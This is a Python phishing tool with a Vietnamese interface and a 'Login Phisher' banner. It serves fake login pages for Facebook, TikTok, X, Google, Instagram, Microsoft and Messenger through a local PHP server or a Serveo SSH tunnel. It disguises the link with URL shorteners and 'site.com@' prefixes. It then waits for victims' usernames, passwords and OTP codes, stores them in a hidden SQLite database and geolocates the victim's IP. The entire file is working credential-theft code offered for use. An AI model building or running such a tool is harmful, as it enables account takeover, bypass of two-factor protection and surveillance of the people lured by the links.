#!/use/bin/env python3

import sys
try:
	import os
	import time
	import json
	import requests
	import platform, subprocess
	import wget
	import shutil
	import requests 
	import pyshorteners
	import sqlite3
except ModuleNotFoundError as error:
	print(error)
	sys.exit()
	
host = "127.0.0.1"
port = "8080"

import os

def logo():
    print("")
    os.system("clear")
    print("""\033[1;32;40m
 ██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
 ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
 ██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
 ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
 ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[0;0m""")

logo()


def user_pass(data):
	username = ""
	password = ""
	try:
		lines = data.split('\n')
		
		for line in lines:
			
			data = line.split(": ")
			if len(data) == 2:
				key =  data[0]
				value = data[1]
				if key == "Username":
					username = value 
				elif key == "Password":
					password = value
	except Exception as error:
		print(error)
	return username, password

	

def save_data(site, username, password, otp):
	
	os.chdir("..") 
	os.chdir("..") 
	try:
		
		conn = sqlite3.connect(".credentials.db")
		conn.execute("""
		CREATE TABLE IF NOT EXISTS data (
		id INTEGER PRIMARY KEY,
		site TEXT,
		username TEXT,
		password TEXT,
		otp TEXT
		)
		""")
		conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
		conn.commit()
		#print("\nThông tin đăng nhập đã được lưu vào cơ sở dữ liệu.\n")
	except sqlite3.Error as error:
		print("Lỗi cơ sở dữ liệu:", error)
	finally:
		conn.close()

def retrieve_data():
	conn = None
	try:
		if (os.path.exists("core/.credentials.db")):
			conn = sqlite3.connect("core/.credentials.db")
			data = conn.execute("SELECT * FROM data")
			print("")
			for line in data:
				print("ID:",line[0])
				print("Site:", line[1])
				print(line[2])
				print(line[3])
				print(line[4])
				print("")
		else:
			print("\n\033[1;91mLỗi: Không tìm thấy tệp cơ sở dữ liệu!\033[0;0m\n")
	except sqlite3.Error as error:
		print("Lỗi cơ sở dữ liệu:", error)
		sys.exit()
	finally:
		if conn is not None:
			conn.close()
		else:
			pass

def delete_data():
	try:
		if (os.path.exists("core/.credentials.db")):
			os.remove("core/.credentials.db")
			print("\nTệp cơ sở dữ liệu đã được xóa thành công.\n")
		else:
			print("\n\033[1;91mLỗi: Không tìm thấy tệp cơ sở dữ liệu!\033[0;0m\n")
	except Exception as error:
		print(error)
		sys.exit()
	
def database_management():
	logo()
	print("")
	print("")
	print("""
Menu Quản lý Thông tin Đăng nhập:
	
[\033[1;92m01\033[0;0m] Lấy thông tin đăng nhập
[\033[1;92m02\033[0;0m] Xóa thông tin đăng nhập
[\033[1;92m00\033[0;0m] Thoát
""")

	while True:
		try:
			option = input("\nOPTION: ")
			option = int(option)
			break
		except:
			print("\n\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
			
	if (option == 1):
		try:
			retrieve_data()
		except Exception as e:
			print(e)
			
	elif (option == 2):
		try:
			delete_data()
		except:
			pass
			
	elif (option == 0):
		sys.exit()
	
	else:
		print("\n\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
	
try:
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print("""\033[1m

    
Hướng dẫn sử dụng:
    python3 login.py [-h] [-p PORT] [-r]
        
Tùy chọn:
    -h,  --help                     Hiển thị thông điệp trợ giúp này.
    -p PORT,  --port PORT           Cổng máy chủ web [Mặc định: 8080].
    -r,  --retrieve                 Lấy thông tin đăng nhập đã lưu.
\033[0;0m""")
            sys.exit()

        elif sys.argv[1] == "-p" or sys.argv[1] == "--port":
            try:
                port = sys.argv[2]
            except:
                pass

        elif sys.argv[1] == "-r" or sys.argv[1] == "--retrieve":
            database_management()
            sys.exit()
        else:
            pass
    else:
        pass

except Exception as error:
    print(error)
    sys.exit()



ostype = subprocess.check_output(["uname","-o"]).strip()    
ostype = ostype.decode()

system = platform.system()     
arch = platform.architecture()    
machine = platform.machine()   


def localhost_server():
	pass
		
def serveo_ssh_tunnel():
	pass


logo()
print("")
print("")
# Hiển thị danh sách nền tảng và yêu cầu người dùng chọn
print("""
Chọn nền tảng:
	  
[\033[1;92m1\033[0;0m] Facebook      [\033[1;92m5\033[0;0m] Instagram
[\033[1;92m2\033[0;0m] TikTok        [\033[1;92m6\033[0;0m] Microsoft
[\033[1;92m3\033[0;0m] X             [\033[1;92m7\033[0;0m] Messenger 
[\033[1;92m4\033[0;0m] Google        [\033[1;92m8\033[0;0m] Exit           
""")

# Nhập lựa chọn của người dùng
while True:
    try:
        option = input("\nOPTION: ").lower()
        if option == "custom":
            break
        else:
            option = int(option)
            break
    except:
        print("\n\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")

# Xử lý lựa chọn nền tảng
if option == 8:
    sys.exit()
else:
    pass

# Hiển thị danh sách server và yêu cầu người dùng chọn
print("""
Chọn server:
	  
[\033[1;92m1\033[0;0m] Localhost
[\033[1;92m2\033[0;0m] Serveo
""")

Tunnels = 2
while True:
    try:
        tunnel = input("\nOPTION: ")
        tunnel = int(tunnel)
        if tunnel > Tunnels:
            print("\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
        else:
            break
    except:
        print("\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")

def start_php_server():
	os.system("""
	php -S {}:{} > /dev/null 2>&1 &
	sleep 4
	""".format(host, port))
	
# def start_ngrok_server():
# 	os.system("""
# 	./ngrok http {} > /dev/null 2>&1 &
# 	sleep 10
# 			""".format(port))	


def is_gd(main_url):
	api = "https://is.gd/create.php?format=simple&url="
	url = api + main_url
	try:
		r = requests.get(url)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			pass
		r.close()
		return short
	except:
		pass 
		
def tiny_url(main_url):
	api = "https://tinyurl.com/api-create.php?url="
	url = api + main_url
	try:
		r = requests.get(url)
		if(r.status_code == 200):
			short = r.text.strip()
		elif(r.status_code != 200):
			shortener = pyshorteners.Shortener()
			short = shortener.tinyurl.short(main_url)
		else:
			pass
		r.close()
		return short
	except:
		pass


def da_gd(main_url):
	api = "https://da.gd/s"
	data = {"url" : main_url}
	try:
		r = requests.post(api, data = data)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			pass
		r.close()
		return short
	except:
		pass


def modify_url(keyword, url):
	try:
		shorted1 = is_gd(url)
	except:
			pass
	try:
		shorted2 = tiny_url(url)
	except:
		pass
	try:
		shorted3 = da_gd(url)
	except:
		pass
		
		
		
	
	try:
		if("https" in url):
			url = url.replace("https://","",1)
		else:
			url = url.replace("http://","",1)
		modified_url1 = keyword + url   
	except:
		modified_url1 = None
		
		
	
	try:
		if("https" in shorted1):
			shorted1= shorted1.replace("https://","",1)
		else:
			shorted1 = shorted1.replace("http://","",1)
		modified_url2 = keyword + shorted1
	except:
		modified_url2 = None
		
		
	
	try:
		if("https" in shorted2):
			shorted2 = shorted2.replace("https://","",1) 
		else:
			shorted2 = shorted2.replace("http://","",1)
		modified_url3 = keyword + shorted2
	except:
		modified_url3 = None
		
		
	
	try:
		if("https" in shorted3):
			shorted3 = shorted3.replace("https://","",1)
		else:
			shorted3 = shorted3.replace("http://","",1)
		modified_url4 = keyword + shorted3
	except:
			modified_url4 = None
			
	return modified_url1, modified_url2, modified_url3, modified_url4
	

keywords = {
"Facebook" : "https://www.facebook.com@",
"TikTok" : "https://www.tiktok.com@",
"X" : "https://twitter.com@",
"Google" : "https://www.google.com@",
"Instagram" : "https://www.instagram.com@",
"Microsoft" : "https://account.microsoft.com@",
"Messenger" : "https://www.messenger.com@",
}

# Danh sách các nền tảng có sẵn
platforms = list(keywords.keys())

def display_platforms():
    """Hiển thị các nền tảng có sẵn."""
    print("\nChọn lại nền tảng để sửa URL:")
    for i, platform in enumerate(platforms, 1):
        print(f"{i}. {platform}")

def edit_url():
    """Sửa URL cho nền tảng đã có."""
    display_platforms()
    
    try:
        # Nhận lựa chọn của người dùng
        choice = int(input("\nNhập số tương ứng: "))
        
        if 1 <= choice <= len(platforms):
            # Sửa URL cho nền tảng đã chọn
            selected_platform = platforms[choice - 1]
            new_url = input(f"Nhập URL mới cho {selected_platform}: ")
            keywords[selected_platform] = new_url
            print(f"Đã cập nhật URL mới cho {selected_platform}.")
        else:
            print("Lựa chọn không hợp lệ.")
    except ValueError:
        print("Nhập số không hợp lệ. Vui lòng thử lại.")

# def display_keywords():
#     """Hiển thị từ điển keywords hiện tại."""
#     print("\nDanh sách nền tảng và URL hiện tại:")
#     for platform, url in keywords.items():
#         print(f"{platform}: {url}")


# update_keywords()
edit_url()  # Thêm gọi hàm sửa URL nếu cần
# display_keywords()



def server(action):

	def php_server():
		print("\n\033[1;92mKhởi động máy chủ PHP...\033[0;0m") 
		start_php_server() 
		os.chdir("../") 
		os.chdir("../") 


	if (tunnel == 1):
		print("\n\033[1;92mKhởi động máy chủ PHP...\033[0;0m")
		
		os.system("""
		php -S {}:{} > tunnel.txt 2>&1 & sleep 5
		""".format(host, port))
		
		os.system("""
		grep -o "http://[-0-9A-Za-z.:]*" "tunnel.txt" -oh > link.txt
		""")

	elif(tunnel == 2):
		php_server()
		
		print("\033[1;92mKhởi động Serveo tunnel...\033[0;0m")
		os.system("""ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:{}:{} serveo.net > tunnel.txt 2>&1 & sleep 10""".format(host, port))
		shutil.move("tunnel.txt","sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
		grep -o "https://[-0-9a-z]*\.serveo.net" "tunnel.txt" -oh > link.txt
		""")

	else:
		print("\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
		
	file = open("link.txt","r")
	link=file.read()
	file.close()
	
	if (len(link) > 0):
		try:
			condition = input("\nBạn có muốn sửa URL không (Y/N) ").lower()
			print("")
		except:
			pass
	else:
		condition = None
	print("\033[1;92mGửi link tới người dùng:\033[0;0m",link)
	
	if (condition == "y" or condition == "yes"):
		keyword = keywords[action]
		modified= modify_url(keyword, link)
		if (modified[0] != None):
			print("\033[1;92mGửi link tới người dùng:\033[0;0m", modified[0])
		else:
			pass
		if (modified[1] != None):
			print("\033[1;92mGửi link tới người dùng:\033[0;0m", modified[1])
		else:
			pass
		if (modified[2] != None):
			print("\033[1;92mGửi link tới người dùng:\033[0;0m", modified[2])
		else:
			pass
		if (modified[3] != None):
			print("\033[1;92mGửi link tới người dùng:\033[0;0m", modified[3])
		else:
			pass
	else:
		pass
	
	
	os.remove("link.txt")
	try:
		os.remove("tunnel.txt")
	except:
		pass
	
	return None



def stop():
	if (tunnel == 1):
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 2):
		os.system("killall ssh > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill ssh > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	else:
		sys.exit()
	return None

	
def work():
	try:
		print("")
		while not (os.path.exists("log.txt")):
			print("\r\033[1;92mĐang chờ thông tin xác thực   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("log.txt") == True):
				print("\r\033[1;92mĐã tìm thấy thông tin xác thực.            \033[0;0m")
			
	except:
		stop()
		sys.exit()
		pass
	try:
		log_file=open("log.txt","r")
		log=log_file.read()
		log_file.close()
	except:
		pass
	return log
	
def work_otp():
	username = ""
	password = ""
	otp_code = ""
	try:
		print("")
		while not (os.path.exists("log.txt")):
			print("\r\033[1;92mĐang chờ thông tin xác thực   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ thông tin xác thực...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("log.txt") == True):
				print("\r\033[1;92mĐã tìm thấy thông tin xác thực.            \033[0;0m")
				try:
					log_file = open("log.txt","r")
					log = log_file.read()
					log_file.close()
					print("")
					print(log)
					try:
						lines = log.split("\n")
						for line in lines:
							if line.startswith("Username: "):
								username = line.split(": ")[1].strip()
							elif line.startswith("Password: "):
							 password = line.split(": ")[1].strip()
							 
					except Exception as error:
						print(error)
				except:
					pass
		while not (os.path.exists("otp.txt")):
			print("\r\033[1;92mĐang chờ mã OTP   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ mã OTP.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ mã OTP.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mĐang chờ mã OTP...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("otp.txt") == True):
				print("\r                                             ",end="\r")
				try:
					otp_file = open("otp.txt","r")
					otp = otp_file.read()
					otp_file.close()
					print(otp)
					otp_code = otp.split(": ")[1]
				except:
					pass
	except:
		stop()
		sys.exit()
		pass
	return username, password, otp_code


def ip_data():
	try:
		ipfile=open("ip.txt","r")
		line=ipfile.readline()
		ipfile.close()
		os.remove("ip.txt")
		ip=line.replace("IP: ","",1)
		ip=str(ip.strip())
		url="http://ip-api.com/json/{}".format(ip)
		data=requests.get(url).json()
		status=data["status"].lower()
		if (status=="success"):
			colour = "\033[1;32m"
		else:
			colour = "\033[1;31m"
		print("\n{}IP STATUS {}\033[0;0m".format(colour,status.upper()))
	except:
		pass
	try:
		if (status=="success"):
			action=input("\nXem thêm thông tin (Y/N): ").lower()
			print("")
			if(action=="y"):
				print("\033[1;92mIP:\033[0;0m",data["query"])
				print("\033[1;92mCountry:\033[0;0m",data["country"])
				print("\033[1;92mCountry code:\033[0;0m",data["countryCode"])
				print("\033[1;92mCity:\033[0;0m",data["city"])
				print("\033[1;92mRegion:\033[0;0m",data["region"])
				print("\033[1;92mRegion name:\033[0;0m",data["regionName"])
				print("\033[1;92mZip:\033[0;0m",data["zip"])
				
				
				print("\033[1;92mLocation:\033[0;0m {},{}".format(data["lat"], data["lon"]))
				print("\033[1;92mTime zone:\033[0;0m",data["timezone"])
				print("\033[1;92mISP:\033[0;0m", data["isp"])
			elif(action=="n"):
				pass
		elif(status=="fail"):
			pass
		else:
			pass
		print("")
	except:
		pass
	return None



def available_tunnels():
	
	if (tunnel == 0):
		sys.exit()
	elif (tunnel == 1):
		localhost_server()
	# elif (tunnel == 2):
	# 	download_ngrok()
	# elif (tunnel == 3):
	# 	cloudflare_tunnel()
	# elif (tunnel == 4):
	# 	localxpose_tunnel()
	elif(tunnel == 2):
		serveo_ssh_tunnel()
	# elif(tunnel == 6):
	# 	local_tunnel()
	else:
		print("\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
			

if (option==1):
	try:
		site = "Facebook"
		available_tunnels()
		os.chdir("core/sites/Facebook")
		server("Facebook")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		
		for line in log.split():
			if "email" in line:
				username = line.replace("email=","Username: ",1)
			elif "pass" in line:
				password = line.replace("pass=","Password: ",1)
				
		print(username)
		print(password)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)


elif (option==2):
	try:
		site = "TikTok"
		available_tunnels()
		os.chdir("core/sites/TikTok")
		server("TikTok")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		for line in log.split():
			if "username=" in line:
				username = line.replace("username=","Username: ",1)
			elif "password=" in line:
				password = line.replace("password=","Password: ",1)
		
		print(username)
		print(password)
				
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)


elif (option==3):
	try:
		site = "X"
		available_tunnels()
		os.chdir("core/sites/X")
		server("X")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		
		for line in log.split():
			if ("usernameOrEmail" in line):
				username = line.replace("usernameOrEmail=","Username: ",1)
			elif ("pass" in line):
				password = line.replace("pass=","Password: ",1)
				
		print(username)
		print(password)
		
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
	
elif (option==4):
	try:
		site = "Google"
		available_tunnels()
		os.chdir("core/sites/Google")
		server("Google")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		
		for line in log.split():
			if "Email" in line:
				username = line.replace("Email=","Username: ",1)
			elif("Passwd" in line):
				password = line.replace("Passwd=","Password: ",1)
		
		print(username)
		print(password)
		
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		

elif (option==5):
	try:
		site = "Instagram"
		available_tunnels()
		os.chdir("core/sites/Instagram")
		server("Instagram")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		for line in log.split():
			if ("username" in line):
				username = line.replace("username=","Username: ",1)
			elif ("password" in line):
				password = line.replace("password=","Password: ",1)
			
		print(username)
		print(password)
		
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		


elif(option==6):
			try:
				site = "Microsoft"
				available_tunnels()
				os.chdir("core/sites/Microsoft")
				server("Microsoft")
				work()
				log=work()
				username = ""
				password = ""
				otp = ""
				
				for line in log.split():
					if ("login_username" in line):
						username = line.replace("login_username=","Username: ",1)
						
					elif ("login_password" in line):
						password = line.replace("login_password=","Password: ",1)
				
				print(username)
				print(password)
			
				stop()
				ip_data()
				try:
					os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)


elif (option==7):
	try:
		site = "Messenger"
		available_tunnels()
		os.chdir("core/sites/Messenger")
		server("Messenger")
		work()
		log=work()
		username = ""
		password = ""
		otp = ""
		for line in log.split():
			if "username=" in line:
				username = line.replace("username=","Username: ",1)
			elif "password=" in line:
				password = line.replace("password=","Password: ",1)
		
		print(username)
		print(password)
				
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
			
else:
	print("\n\033[1;91m[!] Lựa chọn không hợp lệ!\033[0;0m\n")
	
